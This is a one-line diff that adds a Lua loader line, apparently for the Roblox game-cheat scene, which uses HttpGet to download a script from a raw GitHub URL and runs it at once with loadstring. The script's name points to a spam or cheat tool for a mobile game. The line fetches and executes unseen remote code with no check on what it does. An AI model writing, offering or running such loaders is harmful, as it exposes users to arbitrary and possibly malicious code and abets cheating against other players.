@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/path-2-mobile-dragon-generations-spam1-5q0xops5h0s6ud.lua"))()
